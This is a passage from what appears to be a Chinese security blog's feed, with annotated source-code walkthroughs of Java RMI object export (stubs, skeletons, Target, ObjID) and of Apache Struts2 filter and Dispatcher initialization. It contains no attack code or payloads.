(Remote)Proxy.newProxyInstance(var4, var5, var6);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对于用户创建的用户注册的远程对象来说，调用<code>createProxy</code>方法后获得的是一个<code>UnicastRef</code>的动态代理对象，该对象封装了一个<code>LiveRef</code>对象，<br>而这个<code>LiveRef</code>对象中又封装了一个<code>ObjID</code>对象，这个<code>ObjID</code>正是当前创建远程对象的唯一标识符，在后面的操作中调用客户端需要以来这个<code>ObjID</code>来从导出表中查找对应的远程对象。<br><code>setSkeleton</code>方法的调用需要特殊的时机，即<code>createProxy</code>创建的存根对象实现了<code>RemoteStub</code>类，很明显我们自行创建的远程对象的存根对象是没有实现这个类的，那么也只有前面提到的<code>RegistryImpl_Stub</code>对象会实现这个类了。<br>在<code>setSkeleton</code>方法中，其会创建<code>RegistryImpl</code>的骨架，即创建<code>RegistryImpl_Skel</code>对象并存储到<code>UnicastServerRef</code>的<code>skeleton</code>成员变量中。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!withoutSkeletons.containsKey(var1.getClass())) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.skel = Util.createSkeleton(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SkeletonNotFoundException var3) &#123;</span><br><span class="line">            withoutSkeletons.put(var1.getClass(), (Object)<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote var0)</span> <span class="keyword">throws</span> SkeletonNotFoundException &#123;</span><br><span class="line">        Class var1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var1 = getRemoteClass(var0.getClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;object does not implement a remote interface: &quot;</span> + var0.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> Class.forName(var2, <span class="literal">false</span>, var1.getClassLoader());</span><br><span class="line">            <span class="keyword">return</span> (Skeleton)var3.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton class not found: &quot;</span> + var2, var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Can&#x27;t create skeleton: &quot;</span> + var2, var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;No public constructor: &quot;</span> + var2, var6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton not of correct class: &quot;</span> + var2, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>BindObject</code>对象即是我们长在创建的远程对象，后面不在使用<code>正在创建的远程对象</code>这个说法而直接使用<code>BindObject</code>对象代替。<br>在进行<code>Target</code>对象的封装时，首先会创建<code>BindObject</code>对象的弱引用, 创建时传入的第二个参数是一个队列，当<code>BindObject</code>对象被<code>GC</code>回收时,会将弱引用对象加入到这个队列中，<br>通过对这个队列的监听可以定制某个对象被回收时的行为，这是与<code>DGC</code>有关的内容了这里不进行详述，后面会再开一篇专门介绍<code>RMI</code>中的<code>DGC</code>。<br>传入的第二个参数为<code>UnicastServerRef</code>对象本身，其此时作为消息的分发器被传递，后面当服务器接受到客户端的消息时将由该对象对消息进行分发与处理。<br>传入的第三个参数作为<code>BindObject</code>对象的存根，其本身是一个<code>UnicastRef</code>的动态代理对象。<br>传入的第四个参数是<code>ObjID</code>对象，其表示远程对象的唯一标识符。<br>传入的第五个参数表示远程对象是否是持久的，如果为<code>true</code>则表示远程对象是持久的，否则表示远程对象是临时的。我们自行创建的远程对象该参数均为<code>false</code>，即不是持久的对象。<br>其作为弱引用被<code>Target</code>对象引用，当没有其他对象引用时将被<code>GC</code>回收掉，而持久存在的对象则只有系统创建的<code>RegistryImpl</code>以及<code>DGCImpl</code>对象。<br><code>pinImpl</code>方法就是用来进行对象持久化的方法，其本质就是创建了一个使用<code>=</code>号的赋值操作来对远程对象进行引用，只要<code>Target</code>对象不被回收，该远程对象将一直存在。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote var1, Dispatcher var2, Remote var3, ObjID var4, <span class="type">boolean</span> var5)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.weakImpl = <span class="keyword">new</span> <span class="title class_">WeakRef</span>(var1, ObjectTable.reapQueue);</span><br><span class="line">        <span class="built_in">this</span>.disp = var2;</span><br><span class="line">        <span class="built_in">this</span>.stub = var3;</span><br><span class="line">        <span class="built_in">this</span>.id = var4;</span><br><span class="line">        <span class="built_in">this</span>.acc = AccessController.getContext();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var6</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var7</span> <span class="operator">=</span> var1.getClass().getClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (checkLoaderAncestry(var6, var7)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.ccl = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.ccl = var7;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.permanent = var5;</span><br><span class="line">        <span class="keyword">if</span> (var5) &#123;</span><br><span class="line">            <span class="built_in">this</span>.pinImpl();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尾巴处理完了，我们接着看对象的导出操作是什么样的。<br><code>ep</code>以及<code>transport</code>都是再<code>LiveRef</code>实例化过程中创建的对象，需要了解的可以倒回去看看。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ep.exportObject(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.transport.exportObject(var1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下面就是最为核心的对象导出方法了，该方法包含重要的两个步骤，其一是完成<code>serverSocket</code>服务的建立，其二是进行真正的对象导出。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.listen();</span><br><span class="line">            ++<span class="built_in">this</span>.exportCount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var12 = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(var1);</span><br><span class="line">            var2 = <span class="literal">true</span>;</span><br><span class="line">            var12 = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (var12) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.decrementExportCount();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!var2) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先关注<code>serverSocket</code>的建立。  </p>
<h1 id="注册中心是如何启动的"><a href="#注册中心是如何启动的" class="headerlink" title="注册中心是如何启动的"></a>注册中心是如何启动的</h1><h1 id="客户端获取注册中心存根"><a href="#客户端获取注册中心存根" class="headerlink" title="客户端获取注册中心存根"></a>客户端获取注册中心存根</h1><h1 id="客户端查询远程对象"><a href="#客户端查询远程对象" class="headerlink" title="客户端查询远程对象"></a>客户端查询远程对象</h1><h1 id="客户端调用远程对象方法"><a href="#客户端调用远程对象方法" class="headerlink" title="客户端调用远程对象方法"></a>客户端调用远程对象方法</h1><h1 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 原理学习</title>
    <url>/archives/66a16759.html</url>
    <content><![CDATA[<h1 id="过滤器初始化"><a href="#过滤器初始化" class="headerlink" title="过滤器初始化"></a>过滤器初始化</h1><p>Struts2 的访问从配置的<code>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</code>过滤器开始。<br>过滤器在程序加载过程中首先被执行的是<code>init</code>方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">// 创建 InitOperations 对象 负责各个关键组件的初始化操作</span></span><br><span class="line">        <span class="type">InitOperations</span> <span class="variable">init</span> <span class="operator">=</span> createInitOperations(); </span><br><span class="line">        <span class="type">Dispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 简单的包装了一下 filterConfig</span></span><br><span class="line">        <span class="type">FilterHostConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHostConfig</span>(filterConfig);</span><br><span class="line">        <span class="comment">// 初始化日志记录器  不是重点</span></span><br><span class="line">        init.initLogging(config);</span><br><span class="line">        <span class="comment">// 初始化dispatcher 重点</span></span><br><span class="line">        dispatcher = init.initDispatcher(config);</span><br><span class="line">        <span class="comment">// 初始化静态类容加载器</span></span><br><span class="line">        init.initStaticContentLoader(config, dispatcher);</span><br><span class="line">        </span><br><span class="line">        prepare = createPrepareOperations(dispatcher);</span><br><span class="line">        execute = createExecuteOperations(dispatcher);</span><br><span class="line">        <span class="comment">// 设置将哪些path排除到strutsd的filter之外 这些请求将不会被struts处理 而交给之后的filter或者servlet处理</span></span><br><span class="line">        <span class="built_in">this</span>.excludedPatterns = init.buildExcludedPatternsList(dispatcher);</span><br><span class="line">        <span class="comment">// 用户可以继承该过滤器 重写该方法 做一些额外的初始化操作</span></span><br><span class="line">        postInit(dispatcher, filterConfig);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dispatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">        dispatcher.cleanUpAfterInit();</span><br><span class="line">        &#125;</span><br><span class="line">        init.cleanup();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="Dispatcher-初始化"><a href="#Dispatcher-初始化" class="headerlink" title="Dispatcher 初始化"></a>Dispatcher 初始化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Dispatcher <span class="title function_">initDispatcher</span><span class="params">( HostConfig filterConfig )</span> &#123;</span><br><span class="line">    <span class="comment">// 创建Dispatcher 设置了servletContext与initParams </span></span><br><span class="line">        <span class="type">Dispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> createDispatcher(filterConfig);</span><br><span class="line">        <span class="comment">// 执行初始化 重点</span></span><br><span class="line">        dispatcher.init();</span><br><span class="line">        <span class="keyword">return</span> dispatcher;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (configurationManager == <span class="literal">null</span>) &#123;</span><br><span class="line">    		configurationManager = createConfigurationManager(Container.DEFAULT_NAME);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行文件映射器的初始化</span></span><br><span class="line">            init_FileManager();</span><br><span class="line">            <span class="comment">// 执行默认属性的初始化 位于jar包中的默认属性</span></span><br><span class="line">            init_DefaultProperties(); <span class="comment">// [1]</span></span><br><span class="line">        <span class="comment">// 执行配置文件的初始化 包括 struts.xml struts-plugin.xml 等</span></span><br><span class="line">            init_TraditionalXmlConfigurations(); <span class="comment">// [2]</span></span><br><span class="line">        <span class="comment">// 执行自定义配置文件的初始化 自定义的 struts.properties 属性的初始化</span></span><br><span class="line">        <span class="comment">// 这个文件是用于引用其他的配置文件的</span></span><br><span class="line">            init_LegacyStrutsProperties(); <span class="comment">// [3]</span></span><br><span class="line">            init_CustomConfigurationProviders(); <span class="comment">// [5]</span></span><br><span class="line">            init_FilterInitParameters() ; <span class="comment">// [6]</span></span><br><span class="line">            init_AliasStandardObjects() ; <span class="comment">// [7]</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> init_PreloadConfiguration();</span><br><span class="line">            container.inject(<span class="built_in">this</span>);</span><br><span class="line">            init_CheckWebLogicWorkaround(container);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!dispatcherListeners.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (DispatcherListener l : dispatcherListeners) &#123;</span><br><span class="line">                    l.dispatcherInitialized(<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            errorHandler.init(servletContext);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Dispatcher initialization failed&quot;</span>, ex);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="文件映射器初始化"><a href="#文件映射器初始化" class="headerlink" title="文件映射器初始化"></a>文件映射器初始化</h3><p>主要功能是构建了文件管理器与文件管理器工厂<br>文件管理器工厂在查找文件的时候首先会尝试从容器中查找是否配置了文件管理器，如果没有找到，则会查找存储在工厂中的systemFileManager 这个systemFileManager应该也是在bean容器初始化的时候被注入的  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_FileManager</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 如果 filter初始化参数中配置了 struts.fileManager 参数则使用用户自定以的文件管理器  实现了FileManager类</span></span><br><span class="line">        <span class="comment">// 主要功能是进行文件的读写与修改的监控</span></span><br><span class="line">        <span class="keyword">if</span> (initParams.containsKey(StrutsConstants.STRUTS_FILE_MANAGER)) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileManagerClassName</span> <span class="operator">=</span> initParams.get(StrutsConstants.STRUTS_FILE_MANAGER);</span><br><span class="line">            <span class="keyword">final</span> Class&lt;FileManager&gt; fileManagerClass = (Class&lt;FileManager&gt;) Class.forName(fileManagerClassName);</span><br><span class="line">            LOG.info(<span class="string">&quot;Custom FileManager specified: &#123;&#125;&quot;</span>, fileManagerClassName);</span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerProvider</span>(fileManagerClass, fileManagerClass.getSimpleName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 使用默认的文件管理器</span></span><br><span class="line">            <span class="comment">// add any other Struts 2 provided implementations of FileManager</span></span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerProvider</span>(JBossFileManager.class, <span class="string">&quot;jboss&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果设置了文件管理器工厂  struts.fileManagerFactory</span></span><br><span class="line">        <span class="comment">// 这些provider都被添加到  ContainerProvider列表中去了，后面应该会统一调用 他们的register方法将他们一起注册到容器中</span></span><br><span class="line">        <span class="keyword">if</span> (initParams.containsKey(StrutsConstants.STRUTS_FILE_MANAGER_FACTORY)) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileManagerFactoryClassName</span> <span class="operator">=</span> initParams.get(StrutsConstants.STRUTS_FILE_MANAGER_FACTORY);</span><br><span class="line">            <span class="keyword">final</span> Class&lt;FileManagerFactory&gt; fileManagerFactoryClass = (Class&lt;FileManagerFactory&gt;) Class.forName(fileManagerFactoryClassName);</span><br><span class="line">            LOG.info(<span class="string">&quot;Custom FileManagerFactory specified: &#123;&#125;&quot;</span>, fileManagerFactoryClassName);</span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerFactoryProvider</span>(fileManagerFactoryClass));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="默认属性初始化"><a href="#默认属性初始化" class="headerlink" title="默认属性初始化"></a>默认属性初始化</h3><p>主要动作是向containerProvider中添加了 <code>DefaultPropertiesProvider</code>对象，我们重点关注其<code>register</code>方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder builder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 从org/apache/struts2/default.properties文件中加载默认属性</span></span><br><span class="line">            <span class="type">PropertiesSettings</span> <span class="variable">defaultSettings</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(<span class="string">&quot;org/apache/struts2/default&quot;</span>);</span><br><span class="line">            loadSettings(props, defaultSettings);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Could not find or error in org/apache/struts2/default.properties&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PropertiesSettings</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试从多个不同的类加载器中加载属性文件 默认是从当前上下文类加载器加载</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">settingsUrl</span> <span class="operator">=</span> ClassLoaderUtil.getResource(name + <span class="string">&quot;.properties&quot;</span>, getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (settingsUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&#123;&#125;.properties missing&quot;</span>, name);</span><br><span class="line">            settings = <span class="keyword">new</span> <span class="title class_">LocatableProperties</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// LocatableProperties 类是 Properties 的子类 增加了属性的定位功能，包括属性所在行 属性的注释 属性所在文件的url信息</span></span><br><span class="line">        settings = <span class="keyword">new</span> <span class="title class_">LocatableProperties</span>(<span class="keyword">new</span> <span class="title class_">LocationImpl</span>(<span class="literal">null</span>, settingsUrl.toString()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load settings</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> settingsUrl.openStream()) &#123;</span><br><span class="line">            <span class="comment">// 正式从属性文件中加载属性 属性存储在父类对象 Properties 中</span></span><br><span class="line">        <span class="comment">// LocatableProperties 类中直接存储的是定位信息</span></span><br><span class="line">            settings.load(in);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(<span class="string">&quot;Could not load &quot;</span> + name + <span class="string">&quot;.properties: &quot;</span> + e, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将加载的默认书信复制一份到 register方法传入的 props参数中</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadSettings</span><span class="params">(LocatableProperties props, <span class="keyword">final</span> Settings settings)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Iterator</span> <span class="variable">i</span> <span class="operator">=</span> settings.list(); i.hasNext(); ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) i.next();</span><br><span class="line">            props.setProperty(name, settings.get(name), settings.getLocation(name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="传统xml配置文件初始化"><a href="#传统xml配置文件初始化" class="headerlink" title="传统xml配置文件初始化"></a>传统xml配置文件初始化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_TraditionalXmlConfigurations</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 尝试从过滤器初始化参数中获取配置路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">configPaths</span> <span class="operator">=</span> initParams.get(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (configPaths == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有配置则使用默认配置路径</span></span><br><span class="line">        <span class="comment">// struts-default.xml,struts-plugin.xml,struts.xml</span></span><br><span class="line">            configPaths = DEFAULT_CONFIGURATION_PATHS;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] files = configPaths.split(<span class="string">&quot;\\s*[,]\\s*&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String file : files) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 每一个文件添加 一个xmlConfiguationProider</span></span><br><span class="line">                configurationManager.addContainerProvider(createStrutsXmlConfigurationProvider(file, <span class="literal">false</span>, servletContext));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid configuration file name&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点关注<code>StrutsXmlConfigurationProvider</code>的<code>register</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder containerBuilder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    <span class="comment">// 如果有传入servletContext 则此时将servletContext对象添加到容器中</span></span><br><span class="line">        <span class="keyword">if</span> (servletContext != <span class="literal">null</span> &amp;&amp; !containerBuilder.contains(ServletContext.class)) &#123;</span><br><span class="line">            containerBuilder.factory(ServletContext.class, <span class="keyword">new</span> <span class="title class_">Factory</span>&lt;ServletContext&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> ServletContext <span class="title function_">create</span><span class="params">(Context context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                    <span class="keyword">return</span> servletContext;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">ServletContext</span>&gt; type() &#123;</span><br><span class="line">                    <span class="keyword">return</span> servletContext.getClass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用父类的register方法</span></span><br><span class="line">        <span class="built_in">super</span>.register(containerBuilder, props);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>register 的时候  如果 documents 不为空才会有所动作  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder containerBuilder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;Parsing configuration file [&#123;&#125;]&quot;</span>, configFileName);</span><br><span class="line">        Map&lt;String, Node&gt; loadedBeans = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">            <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">            <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">                    <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line">                    <span class="comment">// 解析bean标签</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;bean&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        <span class="comment">// 类型属性</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">                        <span class="comment">// bean名称  同一个类可以有多个bean名称   </span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="comment">// bean 的实现类</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">impl</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                        <span class="comment">// 是否进行静态插入   容器会解析类的静态属性</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">onlyStatic</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;static&quot;</span>);</span><br><span 